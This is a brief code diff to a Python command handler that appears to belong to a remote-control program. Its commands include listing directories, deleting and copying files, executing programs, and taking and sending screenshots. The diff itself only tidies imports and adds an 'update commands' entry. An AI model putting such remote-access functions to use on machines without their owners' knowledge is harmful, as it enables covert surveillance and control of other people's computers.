@@ -2,13 +2,12 @@ import os
 import shutil
 import subprocess
 import pyautogui
-import time
 import glob
 
 IMAGE_PATH = 'screen.jpg'
-VALID_COMMANDS = ("exit", "dir", "delete", "copy", "execute", "take_screenshot", "send_photo")
+VALID_COMMANDS = ("exit", "update commands", "dir", "delete", "copy", "execute", "take_screenshot", "send_photo")
 
-# s
+
 def dir_cmd(path) -> bytes:
     items = glob.glob(path + r"\*.*")
     return ''.join(items).encode()
@@ -36,5 +35,3 @@ def send_photo_cmd() -> bytes:
         image_bytes = photo.read()
     return image_bytes
 
-def print_hello():
-    print("hello")
